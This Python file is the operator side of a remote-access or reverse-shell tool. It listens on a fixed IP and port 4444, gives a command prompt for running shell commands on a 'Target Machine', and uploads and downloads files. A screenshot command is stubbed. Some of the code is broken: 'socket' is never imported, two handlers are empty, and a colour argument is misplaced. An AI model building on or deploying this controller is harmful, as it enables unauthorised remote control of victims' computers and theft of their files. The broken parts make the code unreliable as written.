import os
import json
from vidstream import StreamingServer, ScreenShareClient
from termcolor import colored

def data_recv(client):
    data = ''
    while True:
        try:
            data = data + client.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def data_send(client, data):
    jsondata = json.dumps(data)
    client.send(jsondata.encode())

def upload_file(client, file):
    f = open(file, "rb")
    client.send(f.read())

def download_file(client, file):
    f = open(file, "wb")
    client.settimeout(5)
    chunk = client.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = client.recv(1024)
        except socket.timeout as e:
            break
    client.settimeout(None)
    f.close()

def t_commun(client, ip):
    while True:
        comm = input(f"* Shell~{str(ip)}: ")
        data_send(client, comm)
        if comm == "exit":
            break
        elif comm == "clear":
            os.system("clear")
        elif comm[:3] == "cd ":
            pass  # Implement the logic for changing directory on the Target Machine
        elif comm[:6] == "upload":
            upload_file(client, comm[7:])
        elif comm[:8] == "download":
            download_file(client, comm[9:])
        elif comm[:10] == "screenshot":
            # Implement the logic for taking a screenshot on the Target Machine
            pass
        elif comm == "help":
            print(colored('''\n
            exit: Close the session on the Target Machine.
            clear: Clean the screen from the Terminal.
            cd + "DirectoryName": Change the directory on the Target Machine.
            upload + "FileName": Send a file to the Target Machine.
            download + "FileName": Download a file from the Target Machine.
            screenshot: Takes a screenshot from the Target Machine.
            help: Help the user to use the commands.
            '''), "green")
        else:
            answer = data_recv(client)
            print(answer)

def on_client_connected(client, addr):
    print(colored(f"+ Connected with: {str(addr)}", "green"))
    t_commun(client, addr)

# Start the Streaming Server with the on_client_connected event
server = StreamingServer("10.0.0.219", 4444)
server.on_client_connected = on_client_connected
server.start_server()

# Keep the server running
while True:
    try:
        pass
    except KeyboardInterrupt:
        print("Server shutting down...")
        break
